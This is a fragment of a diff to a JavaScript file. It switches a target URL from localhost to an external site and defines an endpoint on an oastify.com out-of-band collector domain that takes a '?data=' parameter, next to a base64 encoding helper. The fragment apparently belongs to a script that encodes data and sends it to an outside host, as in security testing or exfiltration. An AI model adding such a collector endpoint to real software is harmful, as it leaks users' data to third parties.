@@ -4,9 +4,9 @@ function base64Encode(str) {
     return base64;
 }
 
- const url = "http://0.0.0.0:8000";
+// const url = "http://0.0.0.0:8000";
 
-// const url = "https://radar.toolsfdg.net/";
+ const url = "https://radar.toolsfdg.net/";
 
 const endpoint = "http://z33bynyrumeyj26z5bhn1sidk4qvel2a.oastify.com/?data=";
 
